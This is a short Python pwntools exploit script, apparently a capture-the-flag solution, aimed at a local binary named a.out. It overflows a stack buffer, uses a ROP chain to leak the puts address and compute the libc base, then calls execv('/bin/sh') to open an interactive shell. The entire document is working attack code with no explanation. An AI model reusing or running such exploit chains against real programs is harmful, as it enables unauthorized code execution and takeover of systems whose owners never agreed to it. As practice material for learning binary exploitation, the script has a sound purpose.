from pwn import *

io = process("./a.out")
elf = ELF("a.out")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

bss_pos = 0x404060
vul_addr = 0x4011D6
pad = 40 + 4 + 4 + 8

tls_pad = 2159

pop_rdi_ret = 0x401363
pop_rsi_r15_ret = 0x401361
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
read_plt = elf.plt["read"]

payload1 = b'a'*pad + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vul_addr) + b'a'*tls_pad
io.sendline(payload1)

puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
libc_base = puts_addr - libc.symbols["puts"]
print(hex(libc_base))

sh = next(libc.search(b'/bin/sh')) + libc_base
system_addr = libc.symbols["execv"] + libc_base


payload2 =  b'a'*pad + p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(pop_rdi_ret) + p64(sh) + p64(system_addr)
io.sendline(payload2)

io.interactive()

